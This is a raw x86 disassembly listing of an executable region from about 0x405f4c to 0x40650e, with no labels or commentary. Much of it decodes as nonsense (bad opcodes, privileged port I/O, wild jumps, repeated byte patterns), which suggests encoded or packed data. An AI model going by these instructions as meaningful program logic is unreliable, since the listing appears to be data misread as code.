  405f4c:	88 93 72 ea f5 47    	mov    %dl,0x47f5ea72(%ebx)
  405f52:	88 5e 9b             	mov    %bl,-0x65(%esi)
  405f55:	5f                   	pop    %edi
  405f56:	9f                   	lahf
  405f57:	eb e5                	jmp    0x405f3e
  405f59:	48                   	dec    %eax
  405f5a:	88 fa                	mov    %bh,%dl
  405f5c:	7b 5f                	jnp    0x405fbd
  405f5e:	9f                   	lahf
  405f5f:	e8 e5 46 d3 20       	call   0x2113a649
  405f64:	2a a5 86 1a 00 ab    	sub    -0x54ffe57a(%ebp),%ah
  405f6a:	e0 60                	loopne 0x405fcc
  405f6c:	2a a4 a2 5f 28 a5 85 	sub    -0x7a5ad7a1(%edx,%eiz,4),%ah
  405f73:	eb e5                	jmp    0x405f5a
  405f75:	54                   	push   %esp
  405f76:	9f                   	lahf
  405f77:	90                   	nop
  405f78:	9f                   	lahf
  405f79:	d5 88                	aad    $0x88
  405f7b:	ed                   	in     (%dx),%eax
  405f7c:	e5 18                	in     $0x18,%eax
  405f7e:	2a b5 85 48 af 3b    	sub    0x3baf4885(%ebp),%dh
  405f84:	9f                   	lahf
  405f85:	5f                   	pop    %edi
  405f86:	9f                   	lahf
  405f87:	d5 58                	aad    $0x58
  405f89:	eb e5                	jmp    0x405f70
  405f8b:	54                   	push   %esp
  405f8c:	5a                   	pop    %edx
  405f8d:	63 a0 60 a0 48 c3    	arpl   %esp,-0x3cb75fa0(%eax)
  405f93:	3c 9f                	cmp    $0x9f,%al
  405f95:	5f                   	pop    %edi
  405f96:	d3 20                	shll   %cl,(%eax)
  405f98:	fa                   	cli
  405f99:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  405f9e:	8b 6a 89             	mov    -0x77(%edx),%ebp
  405fa1:	4c                   	dec    %esp
  405fa2:	73 5f                	jae    0x406003
  405fa4:	9f                   	lahf
  405fa5:	48                   	dec    %eax
  405fa6:	3f                   	aas
  405fa7:	35 9f 5f d3 20       	xor    $0x20d35f9f,%eax
  405fac:	fa                   	cli
  405fad:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  405fb2:	08 b0 eb a0 a0 ed    	or     %dh,-0x125f5f15(%eax)
  405fb8:	e5 18                	in     $0x18,%eax
  405fba:	5a                   	pop    %edx
  405fbb:	6b a0 60 a0 48 79 39 	imul   $0x39,0x7948a060(%eax),%esp
  405fc2:	9f                   	lahf
  405fc3:	5f                   	pop    %edi
  405fc4:	2d a5 88 1a a2       	sub    $0xa21a88a5,%eax
  405fc9:	60                   	pusha
  405fca:	a0 60 88 2c 79       	mov    0x792c8860,%al
  405fcf:	5f                   	pop    %edi
  405fd0:	9f                   	lahf
  405fd1:	23 89 46 74 5f 9f    	and    -0x60a08bba(%ecx),%ecx
  405fd7:	4b                   	dec    %ebx
  405fd8:	7e bf                	jle    0x405f99
  405fda:	fe                   	(bad)
  405fdb:	bb 2b 45 fd 23       	mov    $0x23fd452b,%ebx
  405fe0:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  405fe5:	a0 a0 60 a0 a1       	mov    0xa1a060a0,%al
  405fea:	e2 a3                	loop   0x405f8f
  405fec:	e4 a5                	in     $0xa5,%al
  405fee:	e6 a7                	out    %al,$0xa7
  405ff0:	e8 a9 ea ab ec       	call   0xecec4a9e
  405ff5:	ad                   	lods   %ds:(%esi),%eax
  405ff6:	ee                   	out    %al,(%dx)
  405ff7:	af                   	scas   %es:(%edi),%eax
  405ff8:	f0 b1 f2             	lock mov $0xf2,%cl
  405ffb:	b3 f4                	mov    $0xf4,%bl
  405ffd:	b5 f6                	mov    $0xf6,%ch
  405fff:	b7 f8                	mov    $0xf8,%bh
  406001:	b9 fa c1 02 c3       	mov    $0xc302c1fa,%ecx
  406006:	04 c5                	add    $0xc5,%al
  406008:	06                   	push   %es
  406009:	c7                   	(bad)
  40600a:	08 c9                	or     %cl,%cl
  40600c:	0a cb                	or     %bl,%cl
  40600e:	0c cd                	or     $0xcd,%al
  406010:	0e                   	push   %cs
  406011:	cf                   	iret
  406012:	10 d1                	adc    %dl,%cl
  406014:	12 d3                	adc    %bl,%dl
  406016:	14 d5                	adc    $0xd5,%al
  406018:	16                   	push   %ss
  406019:	d7                   	xlat   %ds:(%ebx)
  40601a:	18 d9                	sbb    %bl,%cl
  40601c:	1a 90 d1 92 d3 94    	sbb    -0x6b2c6d2f(%eax),%dl
  406022:	d5 96                	aad    $0x96
  406024:	d7                   	xlat   %ds:(%ebx)
  406025:	98                   	cwtl
  406026:	d9 8b cf 60 a0 60    	(bad) 0x60a060cf(%ebx)
  40602c:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  406031:	61                   	popa
  406032:	a0 60 a0 dc a0       	mov    0xa0dca060,%al
  406037:	60                   	pusha
  406038:	a0 b5 2b 4c 23       	mov    0x234c2bb5,%al
  40603d:	24 88                	and    $0x88,%al
  40603f:	b3 f6                	mov    $0xf6,%bl
  406041:	b7 d3                	mov    $0xd3,%bh
  406043:	29 29                	sub    %ebp,(%ecx)
  406045:	ad                   	lods   %ds:(%esi),%eax
  406046:	88 e9                	mov    %ch,%cl
  406048:	ed                   	in     (%dx),%eax
  406049:	4c                   	dec    %esp
  40604a:	29 b5 98 e9 e5 5c    	sub    %esi,0x5ce5e998(%ebp)
  406050:	d3 20                	shll   %cl,(%eax)
  406052:	f5                   	cmc
  406053:	c8 49 ac e0          	enter  $0xac49,$0xe0
  406057:	60                   	pusha
  406058:	04 5f                	add    $0x5f,%al
  40605a:	d0 c4                	rol    $1,%ah
  40605c:	29 80 d3 3b d3 56    	sub    %eax,0x56d33bd3(%eax)
  406062:	2b a5 9c 48 2f 3a    	sub    0x3a2f489c(%ebp),%esp
  406068:	9f                   	lahf
  406069:	5f                   	pop    %edi
  40606a:	25 20 1e dc 29       	and    $0x29dc1e20,%eax
  40606f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406070:	90                   	nop
  406071:	27                   	daa
  406072:	e5 54                	in     $0x54,%eax
  406074:	a1 60 a0 60 2b       	mov    0x2b60a060,%eax
  406079:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40607a:	9c                   	pushf
  40607b:	eb f5                	jmp    0x406072
  40607d:	54                   	push   %esp
  40607e:	af                   	scas   %es:(%edi),%eax
  40607f:	16                   	push   %ss
  406080:	1c 70                	sbb    $0x70,%al
  406082:	9f                   	lahf
  406083:	eb 66                	jmp    0x4060eb
  406085:	21 80 68 a3 58 2b    	and    %eax,0x2b58a368(%eax)
  40608b:	57                   	push   %edi
  40608c:	23 23                	and    (%ebx),%esp
  40608e:	a8 e3                	test   $0xe3,%al
  406090:	9b                   	fwait
  406091:	66 1c ae             	data16 sbb $0xae,%al
  406094:	23 4b a6             	and    -0x5a(%ebx),%ecx
  406097:	eb 6b                	jmp    0x406104
  406099:	18 a1 60 a0 60 73    	sbb    %ah,0x7360a060(%ecx)
  40609f:	40                   	inc    %eax
  4060a0:	f0 eb 66             	lock jmp 0x406109
  4060a3:	ba 2b 2a 39 57       	mov    $0x57392a2b,%edx
  4060a8:	99                   	cltd
  4060a9:	eb 98                	jmp    0x406043
  4060ab:	eb 6b                	jmp    0x406118
  4060ad:	18 a1 60 a0 60 73    	sbb    %ah,0x7360a060(%ecx)
  4060b3:	40                   	inc    %eax
  4060b4:	f0 eb 66             	lock jmp 0x40611d
  4060b7:	ba 2b 2a 39 57       	mov    $0x57392a2b,%edx
  4060bc:	99                   	cltd
  4060bd:	eb 92                	jmp    0x406051
  4060bf:	ed                   	in     (%dx),%eax
  4060c0:	e5 4c                	in     $0x4c,%eax
  4060c2:	5a                   	pop    %edx
  4060c3:	20 ec                	and    %ch,%ah
  4060c5:	a0 a0 ea b4 9a       	mov    0x9ab4eaa0,%al
  4060ca:	88 26                	mov    %ah,(%esi)
  4060cc:	79 5f                	jns    0x40612d
  4060ce:	9f                   	lahf
  4060cf:	eb f5                	jmp    0x4060c6
  4060d1:	4c                   	dec    %esp
  4060d2:	2b a5 98 48 c7 3a    	sub    0x3ac74898(%ebp),%esp
  4060d8:	9f                   	lahf
  4060d9:	5f                   	pop    %edi
  4060da:	2b a5 98 e3 9b 66    	sub    0x669be398(%ebp),%esp
  4060e0:	1d 12 9f a5 94       	sbb    $0x94a59f12,%eax
  4060e5:	5f                   	pop    %edi
  4060e6:	ed                   	in     (%dx),%eax
  4060e7:	50                   	push   %eax
  4060e8:	15 ee 25 3b 1e       	adc    $0x1e3b25ee,%eax
  4060ed:	89 59 66             	mov    %ebx,0x66(%ecx)
  4060f0:	a0 60 a0 8b 6b       	mov    0x6b8ba060,%al
  4060f5:	eb 9e                	jmp    0x406095
  4060f7:	33 87 ed e5 48 5a    	xor    0x5a48e5ed(%edi),%eax
  4060fd:	20 ec                	and    %ch,%ah
  4060ff:	a0 a0 ea b4 9a       	mov    0x9ab4eaa0,%al
  406104:	88 ec                	mov    %ch,%ah
  406106:	79 5f                	jns    0x406167
  406108:	9f                   	lahf
  406109:	eb f5                	jmp    0x406100
  40610b:	48                   	dec    %eax
  40610c:	2b a5 98 48 8d 39    	sub    0x398d4898(%ebp),%esp
  406112:	9f                   	lahf
  406113:	5f                   	pop    %edi
  406114:	2b a5 98 93 60 ba    	sub    -0x459f6c68(%ebp),%esp
  40611a:	f9                   	stc
  40611b:	b9 04 e9 b0 c8       	mov    $0xc8b0e904,%ecx
  406120:	50                   	push   %eax
  406121:	ac                   	lods   %ds:(%esi),%al
  406122:	e0 60                	loopne 0x406184
  406124:	2d a5 88 1a a2       	sub    $0xa21a88a5,%eax
  406129:	60                   	pusha
  40612a:	a0 60 88 cc 78       	mov    0x78cc8860,%al
  40612f:	5f                   	pop    %edi
  406130:	9f                   	lahf
  406131:	23 89 e6 73 5f 9f    	and    -0x60a08c1a(%ecx),%ecx
  406137:	4b                   	dec    %ebx
  406138:	8b bf fe bb 2b 45    	mov    0x452bbbfe(%edi),%edi
  40613e:	fd                   	std
  40613f:	23 a0 5f 9f 5f 9f    	and    -0x60a060a1(%eax),%esp
  406145:	a0 a0 60 a0 90       	mov    0x90a060a0,%al
  40614a:	d1 92 d3 94 d5 96    	rcll   $1,-0x692a6b2d(%edx)
  406150:	d7                   	xlat   %ds:(%ebx)
  406151:	98                   	cwtl
  406152:	d9 a1 e2 a3 e4 a5    	fldenv -0x5a1b5c1e(%ecx)
  406158:	e6 a7                	out    %al,$0xa7
  40615a:	e8 a9 ea ab ec       	call   0xecec4c08
  40615f:	ad                   	lods   %ds:(%esi),%eax
  406160:	ee                   	out    %al,(%dx)
  406161:	af                   	scas   %es:(%edi),%eax
  406162:	f0 b1 f2             	lock mov $0xf2,%cl
  406165:	b3 f4                	mov    $0xf4,%bl
  406167:	b5 f6                	mov    $0xf6,%ch
  406169:	b7 f8                	mov    $0xf8,%bh
  40616b:	b9 fa c1 02 c3       	mov    $0xc302c1fa,%ecx
  406170:	04 c5                	add    $0xc5,%al
  406172:	06                   	push   %es
  406173:	c7                   	(bad)
  406174:	08 c9                	or     %cl,%cl
  406176:	0a cb                	or     %bl,%cl
  406178:	0c cd                	or     $0xcd,%al
  40617a:	0e                   	push   %cs
  40617b:	cf                   	iret
  40617c:	10 d1                	adc    %dl,%cl
  40617e:	12 d3                	adc    %bl,%dl
  406180:	14 d5                	adc    $0xd5,%al
  406182:	16                   	push   %ss
  406183:	d7                   	xlat   %ds:(%ebx)
  406184:	18 d9                	sbb    %bl,%cl
  406186:	1a 8b cf 60 a0 60    	sbb    0x60a060cf(%ebx),%cl
  40618c:	a0 b5 2b 4c d3       	mov    0xd34c2bb5,%al
  406191:	29 f1                	sub    %esi,%ecx
  406193:	b1 f1                	mov    $0xf1,%cl
  406195:	b1 f1                	mov    $0xf1,%cl
  406197:	b1 f1                	mov    $0xf1,%cl
  406199:	b1 f3                	mov    $0xf3,%cl
  40619b:	b6 f7                	mov    $0xf7,%dh
  40619d:	e9 f5 5c 2b 58       	jmp    0x586bbe97
  4061a2:	d3 20                	shll   %cl,(%eax)
  4061a4:	f5                   	cmc
  4061a5:	c8 e0 ae e0          	enter  $0xaee0,$0xe0
  4061a9:	60                   	pusha
  4061aa:	04 5f                	add    $0x5f,%al
  4061ac:	d0 c4                	rol    $1,%ah
  4061ae:	29 80 2b 27 88 a2    	sub    %eax,-0x5d77d8d5(%eax)
  4061b4:	79 5f                	jns    0x406215
  4061b6:	9f                   	lahf
  4061b7:	eb 78                	jmp    0x406231
  4061b9:	e5 7b                	in     $0x7b,%eax
  4061bb:	de dd                	(bad)
  4061bd:	1e                   	push   %ds
  4061be:	a1 60 a0 60 2d       	mov    0x2d60a060,%eax
  4061c3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4061c4:	8c ea                	mov    %gs,%edx
  4061c6:	f4                   	hlt
  4061c7:	97                   	xchg   %eax,%edi
  4061c8:	9f                   	lahf
  4061c9:	48                   	dec    %eax
  4061ca:	67 38 9f 5f 2b       	cmp    %bl,0x2b5f(%bx)
  4061cf:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4061d0:	8c 1a                	mov    %ds,(%edx)
  4061d2:	f8                   	clc
  4061d3:	ae                   	scas   %es:(%edi),%al
  4061d4:	e0 60                	loopne 0x406236
  4061d6:	88 5a 7b             	mov    %bl,0x7b(%edx)
  4061d9:	5f                   	pop    %edi
  4061da:	9f                   	lahf
  4061db:	e5 60                	in     $0x60,%eax
  4061dd:	d5 b7                	aad    $0xb7
  4061df:	ed                   	in     (%dx),%eax
  4061e0:	e5 48                	in     $0x48,%eax
  4061e2:	2a b4 d7 5f 88 0a 78 	sub    0x780a885f(%edi,%edx,8),%dh
  4061e9:	5f                   	pop    %edi
  4061ea:	9f                   	lahf
  4061eb:	eb f5                	jmp    0x4061e2
  4061ed:	48                   	dec    %eax
  4061ee:	2d a5 90 48 ab       	sub    $0xab4890a5,%eax
  4061f3:	39 9f 5f e6 ab 15    	cmp    %ebx,0x15abe65f(%edi)
  4061f9:	28 2b                	sub    %ch,(%ebx)
  4061fb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4061fc:	9c                   	pushf
  4061fd:	48                   	dec    %eax
  4061fe:	17                   	pop    %ss
  4061ff:	37                   	aaa
  406200:	9f                   	lahf
  406201:	5f                   	pop    %edi
  406202:	d3 20                	shll   %cl,(%eax)
  406204:	29 a5 98 93 60 e9    	sub    %esp,-0x169f6c68(%ebp)
  40620a:	e5 54                	in     $0x54,%eax
  40620c:	2b a5 90 48 85 38    	sub    0x38854890(%ebp),%esp
  406212:	9f                   	lahf
  406213:	5f                   	pop    %edi
  406214:	2b 38                	sub    (%eax),%edi
  406216:	25 3b af ee 30       	and    $0x30eeaf3b,%eax
  40621b:	60                   	pusha
  40621c:	a0 60 5e 61 a0       	mov    0xa0615e60,%al
  406221:	60                   	pusha
  406222:	a0 ed e5 44 2b       	mov    0x2b44e5ed,%al
  406227:	b5 90                	mov    $0x90,%ch
  406229:	ea f4 92 9f 48 03 38 	ljmp   $0x3803,$0x489f92f4
  406230:	9f                   	lahf
  406231:	5f                   	pop    %edi
  406232:	2b a5 84 1a 08 ae    	sub    -0x51f7e57c(%ebp),%esp
  406238:	e0 60                	loopne 0x40629a
  40623a:	88 f6                	mov    %dh,%dh
  40623c:	7b 5f                	jnp    0x40629d
  40623e:	9f                   	lahf
  40623f:	eb 98                	jmp    0x4061d9
  406241:	af                   	scas   %es:(%edi),%eax
  406242:	25 5f 1c c8 2b       	and    $0x2bc81c5f,%eax
  406247:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406248:	94                   	xchg   %eax,%esp
  406249:	21 80 66 a3 58 29    	and    %eax,0x2958a366(%eax)
  40624f:	dd 94 e3 e5 58 a6 e3 	fstl   -0x1c59a71b(%ebx,%eiz,8)
  406256:	1d 58 a8 dc eb       	sbb    $0xebdca858,%eax
  40625b:	e3 0d                	jecxz  0x40626a
  40625d:	58                   	pop    %eax
  40625e:	a8 eb                	test   $0xeb,%al
  406260:	ed                   	in     (%dx),%eax
  406261:	58                   	pop    %eax
  406262:	2b dd                	sub    %ebp,%ebx
  406264:	94                   	xchg   %eax,%esp
  406265:	33 8f eb ed 58 58    	xor    0x5858edeb(%edi),%ecx
  40626b:	61                   	popa
  40626c:	a0 60 a0 33 80       	mov    0x8033a060,%al
  406271:	b0 2b                	mov    $0x2b,%al
  406273:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406274:	94                   	xchg   %eax,%esp
  406275:	ba 2b 2a 39 57       	mov    $0x57392a2b,%edx
  40627a:	99                   	cltd
  40627b:	e9 f5 54 21 47       	jmp    0x4761b775
  406280:	9f                   	lahf
  406281:	60                   	pusha
  406282:	a0 e0 19 68 ef       	mov    0xef6819e0,%al
  406287:	e1 6f                	loope  0x4062f8
  406289:	60                   	pusha
  40628a:	9f                   	lahf
  40628b:	5f                   	pop    %edi
  40628c:	9f                   	lahf
  40628d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40628e:	2d a5 80 eb 77       	sub    $0x77eb80a5,%eax
  406293:	48                   	dec    %eax
  406294:	9d                   	popf
  406295:	37                   	aaa
  406296:	9f                   	lahf
  406297:	5f                   	pop    %edi
  406298:	2b b5 80 eb e5 5c    	sub    0x5ce5eb80(%ebp),%esi
  40629e:	88 be 78 5f 9f eb    	mov    %bh,-0x1460a088(%esi)
  4062a4:	e5 5c                	in     $0x5c,%eax
  4062a6:	e6 ab                	out    %al,$0xab
  4062a8:	af                   	scas   %es:(%edi),%eax
  4062a9:	e5 15                	in     $0x15,%eax
  4062ab:	5f                   	pop    %edi
  4062ac:	9f                   	lahf
  4062ad:	5f                   	pop    %edi
  4062ae:	d3 20                	shll   %cl,(%eax)
  4062b0:	fa                   	cli
  4062b1:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4062b6:	08 a7 ee a0 a0 ed    	or     %ah,-0x125f5f12(%edi)
  4062bc:	e5 40                	in     $0x40,%eax
  4062be:	5a                   	pop    %edx
  4062bf:	65 a0 60 a0 48 75    	mov    %gs:0x7548a060,%al
  4062c5:	36 9f                	ss lahf
  4062c7:	5f                   	pop    %edi
  4062c8:	63 49 8f             	arpl   %ecx,-0x71(%ecx)
  4062cb:	31 9f 5f 8b 4b ff    	xor    %ebx,-0xb474a1(%edi)
  4062d1:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  4062d6:	63 60 a0             	arpl   %esp,-0x60(%eax)
  4062d9:	5f                   	pop    %edi
  4062da:	9f                   	lahf
  4062db:	5f                   	pop    %edi
  4062dc:	9f                   	lahf
  4062dd:	64 a0 60 a0 6d aa    	mov    %fs:0xaa6da060,%al
  4062e3:	69 c0 60 a0 60 a0    	imul   $0xa060a060,%eax,%eax
  4062e9:	5f                   	pop    %edi
  4062ea:	9f                   	lahf
  4062eb:	5f                   	pop    %edi
  4062ec:	9f                   	lahf
  4062ed:	a0 a0 60 a0 90       	mov    0x90a060a0,%al
  4062f2:	d1 92 d3 94 d5 96    	rcll   $1,-0x692a6b2d(%edx)
  4062f8:	d7                   	xlat   %ds:(%ebx)
  4062f9:	98                   	cwtl
  4062fa:	d9 a1 e2 a3 e4 a5    	fldenv -0x5a1b5c1e(%ecx)
  406300:	e6 a7                	out    %al,$0xa7
  406302:	e8 a9 ea ab ec       	call   0xecec4db0
  406307:	ad                   	lods   %ds:(%esi),%eax
  406308:	ee                   	out    %al,(%dx)
  406309:	af                   	scas   %es:(%edi),%eax
  40630a:	f0 b1 f2             	lock mov $0xf2,%cl
  40630d:	b3 f4                	mov    $0xf4,%bl
  40630f:	b5 f6                	mov    $0xf6,%ch
  406311:	b7 f8                	mov    $0xf8,%bh
  406313:	b9 fa c1 02 c3       	mov    $0xc302c1fa,%ecx
  406318:	04 c5                	add    $0xc5,%al
  40631a:	06                   	push   %es
  40631b:	c7                   	(bad)
  40631c:	08 c9                	or     %cl,%cl
  40631e:	0a cb                	or     %bl,%cl
  406320:	0c cd                	or     $0xcd,%al
  406322:	0e                   	push   %cs
  406323:	cf                   	iret
  406324:	10 d1                	adc    %dl,%cl
  406326:	12 d3                	adc    %bl,%dl
  406328:	14 d5                	adc    $0xd5,%al
  40632a:	16                   	push   %ss
  40632b:	d7                   	xlat   %ds:(%ebx)
  40632c:	18 d9                	sbb    %bl,%cl
  40632e:	1a 8b cf 60 a0 60    	sbb    0x60a060cf(%ebx),%cl
  406334:	a0 b5 2b 4c d3       	mov    0xd34c2bb5,%al
  406339:	20 f5                	and    %dh,%ch
  40633b:	c8 71 ae e0          	enter  $0xae71,$0xe0
  40633f:	60                   	pusha
  406340:	04 5f                	add    $0x5f,%al
  406342:	d0 c4                	rol    $1,%ah
  406344:	29 80 9f 65 30 16    	sub    %eax,0x1630659f(%eax)
  40634a:	e0 60                	loopne 0x4063ac
  40634c:	d3 20                	shll   %cl,(%eax)
  40634e:	fa                   	cli
  40634f:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  406354:	08 38                	or     %bh,(%eax)
  406356:	ee                   	out    %al,(%dx)
  406357:	a0 a0 23 89 be       	mov    0xbe8923a0,%al
  40635c:	71 5f                	jno    0x4063bd
  40635e:	9f                   	lahf
  40635f:	4b                   	dec    %ebx
  406360:	98                   	cwtl
  406361:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  406366:	cd f0                	int    $0xf0
  406368:	56                   	push   %esi
  406369:	a0 a0 61 63 5f       	mov    0x5f6361a0,%al
  40636e:	c5 2c d1             	lds    (%ecx,%edx,8),%ebp
  406371:	a1 a0 eb 60 50       	mov    0x5060eba0,%eax
  406376:	ee                   	out    %al,(%dx)
  406377:	a0 a0 6a a9 b4       	mov    0xb4a96aa0,%al
  40637c:	e6 c9                	out    %al,$0xc9
  40637e:	0c c5                	or     $0xc5,%al
  406380:	ee                   	out    %al,(%dx)
  406381:	c1 0d c5 30 60 ef a0 	rorl   $0xa0,0xef6030c5
  406388:	a0 6e aa b4 f3       	mov    0xf3b4aa6e,%al
  40638d:	c5 01                	lds    (%ecx),%eax
  40638f:	d2 03                	rolb   %cl,(%ebx)
  406391:	c8 f2 c5 03          	enter  $0xc5f2,$0x3
  406395:	b8 a1 60 a0 61       	mov    $0x61a060a1,%eax
  40639a:	a0 60 a0 4c ee       	mov    0xee4ca060,%al
  40639f:	a0 a0 6c a0 60       	mov    0x60a06ca0,%al
  4063a4:	a0 b5 2b 4c 0a       	mov    0xa4c2bb5,%al
  4063a9:	60                   	pusha
  4063aa:	0a 60 0a             	or     0xa(%eax),%ah
  4063ad:	60                   	pusha
  4063ae:	f3 b6 f7             	repz mov $0xf7,%dh
  4063b1:	eb 7a                	jmp    0x40642d
  4063b3:	e9 e5 5c d3 20       	jmp    0x2113c09d
  4063b8:	f5                   	cmc
  4063b9:	c8 81 af e0          	enter  $0xaf81,$0xe0
  4063bd:	60                   	pusha
  4063be:	04 5f                	add    $0x5f,%al
  4063c0:	d0 c4                	rol    $1,%ah
  4063c2:	29 80 2b 23 88 0e    	sub    %eax,0xe88232b(%eax)
  4063c8:	75 5f                	jne    0x406429
  4063ca:	9f                   	lahf
  4063cb:	ed                   	in     (%dx),%eax
  4063cc:	ed                   	in     (%dx),%eax
  4063cd:	58                   	pop    %eax
  4063ce:	d3 32                	shll   %cl,(%edx)
  4063d0:	2b a5 9c 48 15 49    	sub    0x4915489c(%ebp),%esp
  4063d6:	9f                   	lahf
  4063d7:	5f                   	pop    %edi
  4063d8:	23 dd                	and    %ebp,%ebx
  4063da:	98                   	cwtl
  4063db:	60                   	pusha
  4063dc:	14 d1                	adc    $0xd1,%al
  4063de:	2b a5 98 e0 d8 82    	sub    -0x7d271f68(%ebp),%esp
  4063e4:	15 9e 2b a5 9c       	adc    $0x9ca52b9e,%eax
  4063e9:	48                   	dec    %eax
  4063ea:	ab                   	stos   %eax,%es:(%edi)
  4063eb:	37                   	aaa
  4063ec:	9f                   	lahf
  4063ed:	5f                   	pop    %edi
  4063ee:	2b 58 23             	sub    0x23(%eax),%ebx
  4063f1:	4f                   	dec    %edi
  4063f2:	a2 dc d9 a7 5e       	mov    %al,0x5ea7d9dc
  4063f7:	62 a0 60 a0 eb e5    	bound  %esp,-0x1a145fa0(%eax)
  4063fd:	5c                   	pop    %esp
  4063fe:	20 dc                	and    %bl,%ah
  406400:	d0 5f c2             	rcrb   $1,-0x3e(%edi)
  406403:	d4 c9                	aam    $0xc9
  406405:	ed                   	in     (%dx),%eax
  406406:	e5 54                	in     $0x54,%eax
  406408:	2b b5 9c ea f4 92    	sub    -0x6d0b1564(%ebp),%esi
  40640e:	9f                   	lahf
  40640f:	48                   	dec    %eax
  406410:	21 36                	and    %esi,(%esi)
  406412:	9f                   	lahf
  406413:	5f                   	pop    %edi
  406414:	2b b5 94 eb 63 48    	sub    0x4863eb94(%ebp),%esi
  40641a:	83 36 9f             	xorl   $0xffffff9f,(%esi)
  40641d:	5f                   	pop    %edi
  40641e:	e6 af                	out    %al,$0xaf
  406420:	15 39 8b 6a 2b       	adc    $0x2b6a8b39,%eax
  406425:	23 2b                	and    (%ebx),%ebp
  406427:	b5 98                	mov    $0x98,%ch
  406429:	48                   	dec    %eax
  40642a:	3f                   	aas
  40642b:	35 9f 5f 2b 73       	xor    $0x732b5f9f,%eax
  406430:	58                   	pop    %eax
  406431:	58                   	pop    %eax
  406432:	ef                   	out    %eax,(%dx)
  406433:	a0 a0 48 5b 4b       	mov    0x4b5b48a0,%al
  406438:	9f                   	lahf
  406439:	5f                   	pop    %edi
  40643a:	2b 50 25             	sub    0x25(%eax),%edx
  40643d:	56                   	push   %esi
  40643e:	1e                   	push   %ds
  40643f:	6f                   	outsl  %ds:(%esi),(%dx)
  406440:	f3 eb a3             	repz jmp 0x4063e6
  406443:	eb 6e                	jmp    0x4064b3
  406445:	1a a1 60 a0 60 88    	sbb    -0x779f5fa0(%ecx),%ah
  40644b:	5e                   	pop    %esi
  40644c:	78 5f                	js     0x4064ad
  40644e:	9f                   	lahf
  40644f:	93                   	xchg   %eax,%ebx
  406450:	60                   	pusha
  406451:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  406456:	b0 c8                	mov    $0xc8,%al
  406458:	88 af e0 60 2d a5    	mov    %ch,-0x5ad29f20(%edi)
  40645e:	94                   	xchg   %eax,%esp
  40645f:	1a a2 60 a0 60 88    	sbb    -0x779f5fa0(%edx),%ah
  406465:	94                   	xchg   %eax,%esp
  406466:	75 5f                	jne    0x4064c7
  406468:	9f                   	lahf
  406469:	23 89 ae 70 5f 9f    	and    -0x60a08f52(%ecx),%ecx
  40646f:	4b                   	dec    %ebx
  406470:	8b bf fe bb 2b 45    	mov    0x452bbbfe(%edi),%edi
  406476:	fd                   	std
  406477:	23 a0 5f 9f 5f 9f    	and    -0x60a060a1(%eax),%esp
  40647d:	61                   	popa
  40647e:	a0 60 a0 bc a0       	mov    0xa0bca060,%al
  406483:	60                   	pusha
  406484:	a0 b3 f6 b7 2b       	mov    0x2bb7f6b3,%al
  406489:	5a                   	pop    %edx
  40648a:	2b 50 2b             	sub    0x2b(%eax),%edx
  40648d:	27                   	daa
  40648e:	88 46 74             	mov    %al,0x74(%esi)
  406491:	5f                   	pop    %edi
  406492:	9f                   	lahf
  406493:	eb 76                	jmp    0x40650b
  406495:	18 d8                	sbb    %bl,%al
  406497:	b0 e0                	mov    $0xe0,%al
  406499:	60                   	pusha
  40649a:	88 b6 8b 5f 9f eb    	mov    %dh,-0x1460a075(%esi)
  4064a0:	78 e5                	js     0x406487
  4064a2:	7b de                	jnp    0x406482
  4064a4:	b0 b7                	mov    $0xb7,%al
  4064a6:	2d b3 a1 19 9f       	sub    $0x9f19a1b3,%eax
  4064ab:	5f                   	pop    %edi
  4064ac:	9f                   	lahf
  4064ad:	df 2b                	fildll (%ebx)
  4064af:	26 88 f8             	es mov %bh,%al
  4064b2:	78 5f                	js     0x406513
  4064b4:	9f                   	lahf
  4064b5:	bf fe bb 63 5f       	mov    $0x5f63bbfe,%edi
  4064ba:	9f                   	lahf
  4064bb:	5f                   	pop    %edi
  4064bc:	9f                   	lahf
  4064bd:	61                   	popa
  4064be:	a0 60 a0 bc a0       	mov    0xa0bca060,%al
  4064c3:	60                   	pusha
  4064c4:	a0 b3 f6 b7 2b       	mov    0x2bb7f6b3,%al
  4064c9:	5a                   	pop    %edx
  4064ca:	2b 38                	sub    (%eax),%edi
  4064cc:	2b 27                	sub    (%edi),%esp
  4064ce:	2b 33                	sub    (%ebx),%esi
  4064d0:	88 58 74             	mov    %bl,0x74(%eax)
  4064d3:	5f                   	pop    %edi
  4064d4:	9f                   	lahf
  4064d5:	eb 73                	jmp    0x40654a
  4064d7:	18 28                	sbb    %ch,(%eax)
  4064d9:	b0 e0                	mov    $0xe0,%al
  4064db:	60                   	pusha
  4064dc:	88 74 8b 5f          	mov    %dh,0x5f(%ebx,%ecx,4)
  4064e0:	9f                   	lahf
  4064e1:	eb 90                	jmp    0x406473
  4064e3:	e5 96                	in     $0x96,%eax
  4064e5:	de b2 b7 2b 2e e9    	fidivs -0x16d1d449(%edx)
  4064eb:	1a a1 60 a0 60 2b    	sbb    0x2b60a060(%ecx),%ah
  4064f1:	23 88 b6 78 5f 9f    	and    -0x60a0874a(%eax),%ecx
  4064f7:	4b                   	dec    %ebx
  4064f8:	a9 eb 67 eb 73       	test   $0x73eb67eb,%eax
  4064fd:	48                   	dec    %eax
  4064fe:	6b 34 9f 5f          	imul   $0x5f,(%edi,%ebx,4),%esi
  406502:	ff                   	(bad)
  406503:	be fb 23 a0 60       	mov    $0x60a023fb,%esi
  406508:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  40650d:	61                   	popa
  40650e:	a0 60 a0 8e a0       	mov    0xa08ea060,%al
